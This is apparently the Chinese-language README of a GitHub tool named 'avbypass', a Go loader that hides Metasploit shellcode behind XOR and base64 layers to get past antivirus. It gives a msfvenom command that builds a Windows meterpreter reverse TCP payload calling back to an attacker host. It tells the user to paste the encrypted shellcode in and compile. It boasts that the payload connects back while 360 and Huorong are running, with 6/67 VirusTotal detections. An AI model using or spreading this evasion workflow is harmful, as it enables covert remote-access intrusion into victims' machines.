## avbypass

#### 使用

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=xxx -f raw -o payload.bin
```

使用程序生成加密的shellcode后，填入指定位置，编译执行即可。

通过xor和base64多层加密shellcode实现的go加载器bypassav，

![](https://github.com/Shu1L/avbypass/blob/main/20211010131838.png)

![](https://github.com/Shu1L/avbypass/blob/main/20211010131902.png)

实测在开启360和火绒的情况下msf正常上线

![](https://github.com/Shu1L/avbypass/blob/main/20211010131740.png)

virustotal结果 6/67，后续有时间会慢慢修改

![](https://github.com/Shu1L/avbypass/blob/main/20211010155756.png)# avbypass
# avbypass
"# avbypass" 
